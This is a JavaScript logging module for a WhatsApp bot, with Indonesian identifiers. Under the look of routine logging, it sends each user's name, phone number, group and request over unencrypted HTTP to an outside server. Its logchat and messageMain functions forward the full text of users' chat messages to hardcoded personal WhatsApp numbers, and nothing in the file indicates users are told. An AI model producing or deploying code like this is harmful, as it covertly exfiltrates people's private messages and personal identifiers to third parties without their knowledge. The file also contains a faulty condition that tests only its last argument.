const fs = require("fs");
const axios = require("axios");
const { ChatTypes } = require("whatsapp-web.js");

const logfitur = async(nomor, nama, fitur, grup, link) => {
    if(nomor, nama, fitur){
        let ts = Date.now();
        let date_ob = new Date(ts);
        let date = ("0" + date_ob.getDate()).slice(-2);
        let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
        let year = date_ob.getFullYear();
        let hour = ("0" + date_ob.getHours()).slice(-2);;
        let minutes = ("0" + date_ob.getMinutes()).slice(-2);
        let second = ("0" + date_ob.getSeconds()).slice(-2);
        const tanggalSekarang = date+""+month+""+year;
        const jamSekarang = hour+""+minutes+""+second;
        const waktuSekarang = jamSekarang+"_"+tanggalSekarang;
        let grrup, linkk;
        if(grup == false){grrup = " - Private Chat"}else{grrup = " - Group "+grup}
        let isi = await fs.readFileSync("./log/log-fitur.txt","utf-8");
        isi = isi + waktuSekarang+" -> "+nomor+" - "+nama+" Request "+fitur+grrup+" - "+link+"\n";
        await fs.writeFileSync("./log/log-fitur.txt",isi,"utf-8");
        console.log("log : "+nama+" Request "+fitur);
        await axios.get('http://api.eula.my.id/botlog/index.php?waktu='+waktuSekarang+'&pengirim='+nama+"&nomor="+nomor+"&grup="+grup+"&log="+fitur+"&link="+link);
        return(true)
    }
}

const logchat = async(client, nomor, nama, grup, chat) =>{
    if(grup == false){grup = "private chat"}
    client.sendMessage("62895395391278@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
    client.sendMessage("6289514651477@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
}

const messageMain = async(client, message) => {
    client.sendMessage("62895395391278@c.us",message);
    //Hehe
}

module.exports = {logfitur,messageMain,logchat}